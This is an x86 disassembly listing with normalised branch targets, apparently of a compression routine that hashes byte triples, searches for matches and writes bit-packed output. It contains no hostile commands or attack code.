mov ebx [ edi + eax * 4 ]
mov edi [ edx + 0x68 ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x64 ]
mov ebx [ ebp - 0x10 ]
mov [ edi + eax * 4 ] ecx
mov edi [ edx + 0x6c ]
mov [ edi + ecx * 4 ] ebx
mov edi [ edx + 0x70 ]
inc [ edi + eax * 4 ]
movzx edi [ esi + ecx ]
mov eax [ edx + 0x74 ]
mov [ eax + edi * 4 ] ecx
mov edi [ edx + 0x30 ]
mov eax [ edi + 0x1c ]
cmp eax [ edi + 0x24 ]
jae r-xdata
mov [ eax + ebx * 4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + eax ] bl
cmp eax [ edx + 0x4 ]
jae r-xdata
inc ecx
cmp ecx ebx
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov ebx [ edx + 0x50 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
mov edi [ edx + 0x54 ]
mov [ eax + edi ] bl
jmp r-xdata
mov edi [ ebp - 0xc ]
inc edi
mov [ ebp - 0xc ] edi
cmp edi ebx
jne r-xdata
xor ecx ecx
dec [ ebp + 0x8 ]
jne r-xdata
xor edi edi
mov [ ebp - 0xc ] edi
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov esi [ ebp - 0x8 ]
mov [ edx + 0x4c ] edi
pop edi
mov [ edx + 0x58 ] esi
pop esi
mov [ edx + 0x48 ] ecx
mov [ edx + 0x44 ] eax
pop ebx
sub_406c80
push ebp
mov ebp esp
push ecx
mov edx [ esi + 0x20 ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x48 ]
add edi [ esi + 0x60 ]
cmp [ ebp + 0xc ] 0x0
mov al [ edi + edx - 0x1 ]
mov [ ebp - 0x1 ] al
jbe r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
nop
cmp [ ebp + 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov ebx [ eax + ebx * 4 ]
mov [ ebp + 0x8 ] ebx
ja r-xdata
mov cl [ eax + edx ]
cmp cl [ edi + edx ]
jne r-xdata
mov eax [ esi + 0x60 ]
mov cl [ ebp - 0x1 ]
dec [ ebp + 0xc ]
add eax ebx
cmp [ eax + edx - 0x1 ] cl
jne r-xdata
mov cl [ eax ]
cmp cl [ edi ]
jne r-xdata
mov cl [ eax + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
lea ecx [ edi + 0x2 ]
add eax 0x2
lea ecx [ ecx ]
mov ebx [ ebp + 0x8 ]
sub ecx edi
cmp ecx edx
jbe r-xdata
mov bl [ ecx ]
inc eax
cmp bl [ eax ]
je r-xdata
mov edx ecx
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] ebx
cmp ecx [ esi + 0x28 ]
je r-xdata
mov ebx [ esi + 0x28 ]
inc ecx
add ebx edi
cmp ecx ebx
jae r-xdata
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov eax [ esi + 0x6c ]
cmp ecx [ eax + ebx * 4 ]
ja r-xdata
mov cl [ ecx + edi - 0x1 ]
mov [ ebp - 0x1 ] cl
sub_406d20
mov edx [ eax + 0x48 ]
mov ecx [ eax + 0x60 ]
movzx ecx [ ecx + edx ]
mov edx [ eax + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
jne r-xdata
mov edx 0x2
cmp [ eax + 0x20 ] edx
jae r-xdata
xor eax eax
retn
mov eax 0x1
retn
mov [ eax + 0x20 ] edx
mov [ eax + 0x34 ] ecx
sub_406d50
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi eax
mov edx [ esi + 0x48 ]
mov eax [ esi + 0x60 ]
lea ecx [ edx + eax ]
movzx eax [ ecx ]
push edi
movzx edi [ ecx + 0x1 ]
shl eax 0x5
xor eax edi
movzx edi [ ecx + 0x2 ]
mov ebx [ esi + 0x68 ]
shl eax 0x5
xor eax edi
mov edi [ esi + 0x64 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
lea edi [ edi + eax * 4 ]
mov [ ebp - 0x4 ] edi
mov edi [ edi ]
mov [ ebx + edx * 4 ] edi
mov [ ebp - 0x8 ] edi
mov edi [ esi + 0x70 ]
lea eax [ edi + eax * 4 ]
mov edi [ eax ]
lea ebx [ edi + 0x1 ]
mov [ eax ] ebx
mov eax [ esi + 0x10 ]
cmp edi eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ esi + 0x28 ]
mov [ eax ] edx
movzx eax [ ecx ]
mov [ esi + 0x2c ] eax
mov eax [ esi + 0x20 ]
mov [ ebp - 0x4 ] eax
cmp eax ebx
jb r-xdata
test eax eax
je r-xdata
movzx ecx [ ecx ]
mov edx [ esi + 0x74 ]
mov ecx [ edx + ecx * 4 ]
cmp ecx 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
mov edi eax
mov edi [ esi + 0x20 ]
cmp edi [ ebp - 0x4 ]
jbe r-xdata
cmp eax 0x2
jae r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0x6c ]
inc ecx
mov [ esi + 0x24 ] 0x0
mov [ eax + edx * 4 ] ecx
jmp r-xdata
mov [ esi + 0x2c ] 0xffffffff
mov edx [ esi + 0x48 ]
mov ecx [ esi + 0x6c ]
mov [ ecx + edx * 4 ] edi
mov ecx [ esi + 0x48 ]
mov edx [ esi + 0x34 ]
cmp ecx edx
jbe r-xdata
cmp ebx 0x3
jb r-xdata
mov [ esi + 0x20 ] 0x2
mov [ esi + 0x34 ] ecx
mov eax [ esi + 0x58 ]
mov edi [ esi + 0x4c ]
test eax eax
jne r-xdata
dec eax
mov [ esi + 0x58 ] eax
mov eax [ esi + 0x60 ]
movzx ebx [ edi + eax ]
lea ecx [ edi + eax ]
movzx eax [ ecx + 0x1 ]
shl ebx 0x5
xor eax ebx
movzx ebx [ ecx + 0x2 ]
shl eax 0x5
xor eax ebx
mov ebx [ esi + 0x70 ]
imul eax eax 0x9f5f
shr eax 0x5
and eax 0xffff
dec [ ebx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
movzx eax [ ecx ]
mov ecx [ esi + 0x74 ]
cmp [ ecx + eax * 4 ] edi
lea eax [ ecx + eax * 4 ]
jne r-xdata
mov eax [ esi + 0x50 ]
sub eax edx
add eax ecx
sub ecx edx
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
push edi
push eax
call sub_406c80
add esp 0x8
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] 0xffffffff
mov eax [ esi + 0x60 ]
movzx ecx [ edx + eax ]
mov eax [ esi + 0x74 ]
pop edi
pop esi
mov [ eax + ecx * 4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi + 0x24 ] eax
sub_406ed0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ eax ] 0x1
mov [ esi + 0x30 ] eax
mov [ eax + 0x14 ] edi
mov [ eax + 0x10 ] edi
mov [ eax + 0x7c ] edi
mov [ eax + 0x78 ] edi
mov [ eax + 0x74 ] edi
mov [ eax + 0x88 ] edi
mov [ eax + 0x84 ] edi
mov [ eax + 0x80 ] edi
mov [ eax + 0x8c ] edi
call sub_4067b0
mov ebx eax
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
and eax 0x1
pop edi
mov [ esi + 0x18 ] eax
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_4069d0
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_406f40
push ebp
mov ebp esp
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
sub esi eax
mov ecx esi
sub ecx eax
push ecx
mov edx ebx
call sub_406b30
sub esi [ ebp + 0x8 ]
add esp 0x4
inc esi
jmp r-xdata
mov ecx [ ebx + 0x28 ]
inc ecx
mov [ edi + 0x4 ] ecx
mov esi ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_4069d0
jmp r-xdata
add [ edi + 0x74 ] esi
mov eax ebx
mov [ ebx + 0x20 ] 0x1
call sub_406d50
mov eax [ ebx + 0x24 ]
mov edx [ ebx + 0x20 ]
mov [ edi + 0xc ] eax
mov eax ebx
mov [ edi + 0x8 ] edx
call sub_406a50
xor eax eax
cmp [ ebx + 0x2c ] eax
jge r-xdata
xor eax eax
pop ebp
retn
mov ecx [ edi + 0x74 ]
cmp ecx [ edi + 0x7c ]
jbe r-xdata
mov edx [ edi + 0x1c ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x70 ]
mov [ edi + 0x18 ] edx
pop esi
test eax eax
je r-xdata
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push edx
mov edx [ edi + 0x78 ]
push 0x3
push edx
push ecx
call eax
add esp 0x10
add [ edi + 0x7c ] 0x400
sub_406fe0
push esi
xor esi esi
cmp edx 0xffffffff
je r-xdata
cmp eax 0xffffffff
je r-xdata
cmp edx esi
je r-xdata
mov [ ecx + 0x2c ] esi
mov [ ecx + 0x30 ] esi
mov [ ecx + 0x40 ] esi
mov [ ecx + 0x44 ] esi
xor eax eax
pop esi
retn
cmp eax 0x8
je r-xdata
mov [ ecx + 0x34 ] esi
or eax 0xffffffff
pop esi
retn
mov [ ecx + 0x38 ] eax
cdq
and edx 0x7
add eax edx
sar eax 0x3
mov [ ecx + 0x3c ] eax
cmp eax 0x10
je r-xdata
cmp eax 0x20
jne r-xdata
sub_407030
mov ecx [ esi + 0x40 ]
mov eax [ esi + 0x2c ]
mov [ ecx ] al
cmp [ esi + 0x38 ] 0x10
jb r-xdata
retn
mov edx eax
shr edx 0x8
mov [ ecx + 0x1 ] dl
cmp [ esi + 0x38 ] 0x20
jne r-xdata
mov edx eax
shr edx 0x10
shr eax 0x18
mov [ ecx + 0x2 ] dl
mov [ ecx + 0x3 ] al
sub_407060
mov ecx [ eax + 0x30 ]
push esi
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] edi
mov [ eax + 0x30 ] 0x1
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edi + edx * 2 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
sub_4070e0
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
mov [ eax + 0x40 ] 0x0
retn
push esi
cmp ecx [ eax + 0x38 ]
je r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
xor ecx ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x40 ] ecx
pop esi
retn
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
add edx edx
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jne r-xdata
sub_4071b0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2
jb r-xdata
and edi 0x1
call sub_407060
mov edi 0x1
call sub_407060
pop edi
pop ebp
retn
push ebx
add edi 0x2
push esi
mov esi 0x4
mov [ ebp + 0x8 ] edi
lea ecx [ ecx ]
add esi esi
cmp edi esi
jae r-xdata
shr esi 0x1
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ edi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ edi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
shl [ eax + 0x2c ] 0x1
inc ecx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx edi
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ edi + 0x2 ] dl
mov [ edi + 0x3 ] cl
mov edi [ ebp + 0x8 ]
cmp esi 0x2
ja r-xdata
sub_4072e0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp edi 0x2
jb r-xdata
and edi 0x1
call sub_407060
mov edi 0x1
call sub_407060
pop edi
pop ebp
retn
push ebx
push esi
mov esi 0x2
sub edi esi
add esi esi
add esi esi
cmp edi esi
jae r-xdata
mov [ ebp + 0x8 ] edi
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ edi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov [ eax + 0x2c ] ecx
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x30 ] 0x1
mov edx ecx
shr edx 0x8
mov [ edi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
shl [ eax + 0x2c ] 0x1
inc ecx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov edi [ eax + 0x40 ]
mov edx [ eax + 0x2c ]
mov [ edi ] dl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test edx edx
jne r-xdata
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ edi + 0x2 ] dl
mov [ edi + 0x3 ] cl
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
mov edx [ eax + 0x44 ]
mov edi [ eax + 0x3c ]
add edi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] edi
mov [ eax + 0x30 ] 0x1
mov ebx edx
shr ebx 0x8
mov [ edi + 0x1 ] bl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edi [ eax + 0x2c ]
inc edx
lea ecx [ ecx + edi * 2 ]
mov [ eax + 0x30 ] edx
jmp r-xdata
mov edi [ eax + 0x44 ]
mov ebx [ eax + 0x3c ]
add ebx edi
mov [ eax + 0x40 ] edi
mov [ eax + 0x44 ] ebx
mov edx [ eax + 0x30 ]
shr esi 0x1
mov ecx esi
and ecx edi
neg ecx
sbb ecx ecx
neg ecx
cmp edx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov ebx edx
shr ebx 0x10
shr edx 0x18
mov [ edi + 0x2 ] bl
mov [ edi + 0x3 ] dl
mov edi [ ebp + 0x8 ]
mov [ eax + 0x2c ] ecx
cmp esi 0x2
ja r-xdata
sub_407480
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x54 ]
push edi
cmp ebx eax
jbe r-xdata
mov eax [ esi + 0x6c ]
add [ esi + 0x84 ] ebx
cmp ebx [ eax + 0xc ]
jbe r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
add eax 0xfffffffd
push eax
push esi
call sub_407480
mov eax [ esi + 0x54 ]
mov edx 0x3
sub edx eax
add ebx edx
add esp 0xc
cmp ebx eax
ja r-xdata
mov eax [ esi + 0x6c ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0x4 ]
jbe r-xdata
mov [ eax + 0xc ] ebx
xor edi edi
mov eax esi
call sub_407060
mov ecx [ ebp + 0x10 ]
mov eax 0x500
cmp eax ecx
sbb edx edx
or eax 0xffffffff
neg edx
sub eax edx
add ebx eax
mov edx 0x2
cmp edx ebx
sbb eax eax
inc eax
mov [ ebp + 0x8 ] eax
mov eax esi
cmp ecx [ esi + 0x14 ]
jne r-xdata
mov [ eax + 0x4 ] ecx
dec ecx
shr ecx 0x7
inc ecx
push ecx
call sub_4072e0
mov al [ ebp + 0x10 ]
mov cl [ ebp + 0x8 ]
mov edx [ esi + 0x44 ]
dec al
add al al
xor cl 0x1
or al cl
add esp 0x4
mov [ edx ] al
inc [ esi + 0x44 ]
call sub_407060
mov edi 0x1
call sub_407060
mov edi [ ebp + 0x8 ]
call sub_407060
jmp r-xdata
cmp ebx 0x4
ja r-xdata
lea edi [ ebx - 0x1 ]
call sub_407060
mov eax [ ebp + 0x10 ]
pop edi
mov [ esi + 0x14 ] eax
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
mov eax esi
je r-xdata
xor edi edi
call sub_407060
add ebx 0xfffffffb
push ebx
call sub_4071b0
mov edx [ ebp + 0x10 ]
add esp 0x4
pop edi
mov [ esi + 0x14 ] edx
pop esi
pop ebx
pop ebp
retn
mov edi 0x1
call sub_407060
lea edi [ ebx - 0x3 ]
call sub_407060
mov ecx [ ebp + 0x10 ]
pop edi
mov [ esi + 0x14 ] ecx
pop esi
pop ebx
pop ebp
retn
sub_4075a0
push ebp
mov ebp esp
push edi
mov edi ecx
test edi edi
je r-xdata
pop edi
pop ebp
retn
mov ecx [ eax + 0x6c ]
add [ eax + 0x80 ] edi
cmp edi [ ecx + 0x14 ]
jbe r-xdata
push ebx
push esi
mov ebx 0x1
mov [ ecx + 0x14 ] edi
mov esi [ eax + 0x40 ]
mov ecx [ eax + 0x2c ]
mov [ esi ] cl
cmp [ eax + 0x38 ] 0x10
jb r-xdata
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x3c ]
add edx ecx
mov [ eax + 0x40 ] ecx
mov [ eax + 0x44 ] edx
mov [ eax + 0x2c ] ebx
mov [ eax + 0x30 ] ebx
mov edx ecx
shr edx 0x8
mov [ esi + 0x1 ] dl
cmp [ eax + 0x38 ] 0x20
jne r-xdata
mov edx [ eax + 0x2c ]
lea edx [ edx + edx + 0x1 ]
inc ecx
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
jmp r-xdata
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x3c ]
add esi edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] esi
mov ecx [ eax + 0x30 ]
cmp ecx [ eax + 0x38 ]
jae r-xdata
pop esi
pop ebx
mov edx ecx
shr edx 0x10
shr ecx 0x18
mov [ esi + 0x2 ] dl
mov [ esi + 0x3 ] cl
mov esi [ ebp + 0x8 ]
mov dl [ esi ]
mov ecx [ eax + 0x44 ]
mov [ ecx ] dl
add [ eax + 0x44 ] ebx
add esi ebx
sub edi ebx
mov [ ebp + 0x8 ] esi
jne r-xdata
sub_407650
cmp edx 0x2
jb r-xdata
or eax 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x50 ]
ja r-xdata
cmp ecx 0x500
ja r-xdata
push esi
mov esi 0x500
cmp esi ecx
sbb esi esi
push edi
neg esi
mov edi 0xfffffffe
sub edi esi
add edx edi
pop edi
pop esi
cmp ecx [ eax + 0x14 ]
jne r-xdata
dec ecx
shr ecx 0x7
mov eax 0xa
test ecx ecx
je r-xdata
mov eax 0x3
jmp r-xdata
add eax 0x2
cmp edx 0x2
jb r-xdata
shr ecx 0x2
add eax 0x3
test ecx ecx
jne r-xdata
retn
cmp edx 0x4
jae r-xdata
sub edx 0x4
inc eax
retn
add eax 0x2
shr edx 0x1
jne r-xdata
retn
sub_4076c0
push ebp
mov ebp esp
sub esp 0x170
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0xf0 ] eax
mov eax [ ebp + 0x10 ]
push edi
mov edi ecx
lea ecx [ eax - 0x1 ]
mov ebx edx
cmp ecx 0x9
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0xfffffffe
pop ebx
call sub_40b946
mov esp ebp
pop ebp
retn
push esi
lea esi [ eax * 8 ]
push 0x90
sub esi eax
lea edx [ ebp - 0xd4 ]
push 0x0
lea esi [ esi * 4 + r--data ]
push edx
mov [ ebp - 0xdc ] esi
call sub_4105f0
or eax 0xffffffff
lea ecx [ ebp - 0x44 ]
push 0x40
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
lea eax [ ebx + edi ]
mov [ ebp - 0xb4 ] edi
mov [ ebp - 0xb8 ] edi
mov edi [ ebp + 0x8 ]
mov edx ecx
push 0x0
push edx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] edi
mov [ ebp - 0x68 ] ecx
call sub_4105f0
mov ecx [ ebp - 0x68 ]
or eax 0xffffffff
mov [ ecx + 0x10 ] eax
mov edx [ ebp - 0x68 ]
mov [ edx + 0x8 ] eax
mov ecx [ ebp - 0x68 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8c ]
xor eax eax
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] eax
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x90 ] eax
mov eax [ ebp - 0x88 ]
add esp 0x18
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x9c ] 0x8
mov [ ebp - 0x98 ] 0x1
call sub_406fe0
test eax eax
jne r-xdata
pop esi
pop edi
mov eax 0xfffffffe
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xb8 ]
mov [ ebp - 0xd8 ] eax
mov eax [ ebp - 0x80 ]
mov [ ebp - 0xe0 ] edx
mov [ ebp - 0x90 ] edi
mov edx 0x800
cmp eax 0x800
jae r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp - 0x16c ] edx
cmp eax 0x800000
jb r-xdata
mov edx eax
mov ecx [ ebp - 0x84 ]
mov edi 0xffff
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x164 ] edi
cmp ecx 0xffffffff
je r-xdata
mov eax 0x800000
cmp ebx eax
jae r-xdata
mov eax 0x800000
cmp ecx 0x800000
jae r-xdata
cmp edx 0x8
jb r-xdata
mov eax ebx
cmp ebx 0x100
jae r-xdata
mov [ ebp - 0x170 ] eax
mov eax ecx
cmp eax 0x100
jb r-xdata
mov [ ebp - 0x170 ] eax
mov eax 0x100
mov eax [ esi + 0x14 ]
push eax
lea ecx [ ebp - 0x170 ]
lea eax [ ebp - 0xd4 ]
call sub_406ed0
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x164 ] edi
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ ebp - 0x160 ] eax
mov eax [ ebp - 0x80 ]
cmp eax [ ebp - 0x15c ]
jae r-xdata
mov [ ebp - 0x15c ] eax
mov eax [ ebp - 0x64 ]
test eax eax
je r-xdata
mov [ ebp - 0x15c ] eax
push 0x0
xor eax eax
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0xc0 ] 0x1
call sub_406f40
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push 0xffffffff
push 0x0
push 0x0
call edx
add esp 0x10
cmp [ ebp - 0xd0 ] eax
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_4075a0
xor edi edi
call sub_407060
push 0x1000000
call sub_4072e0
mov eax [ ebp - 0x90 ]
mov [ eax ] 0xff
inc [ ebp - 0x90 ]
add esp 0x8
lea eax [ ebp - 0xd4 ]
call sub_4070e0
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
mov edx [ ebp - 0xf0 ]
mov ecx eax
mov [ edx ] eax
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x5c ] ecx
test eax eax
je r-xdata
mov edi [ ebp - 0xcc ]
jmp r-xdata
lea esi [ ebp - 0x170 ]
call sub_4069d0
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40b946
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x4 ]
push edx
mov edx [ eax ]
push 0x4
push ecx
mov ecx [ ebp - 0x60 ]
push ecx
call edx
add esp 0x10
mov eax [ ebp - 0x90 ]
sub eax [ ebp + 0x8 ]
cmp [ ebp - 0xd8 ] 0x0
mov ecx [ ebp - 0xc8 ]
mov ebx edi
mov [ ebp - 0x5c ] eax
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf8 ] ecx
jne r-xdata
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xbc ]
mov [ ebp - 0xe0 ] edx
mov ecx [ esi + 0x10 ]
mov eax 0x1
add [ ebp - 0xd8 ] eax
push 0x0
lea ebx [ ebp - 0x170 ]
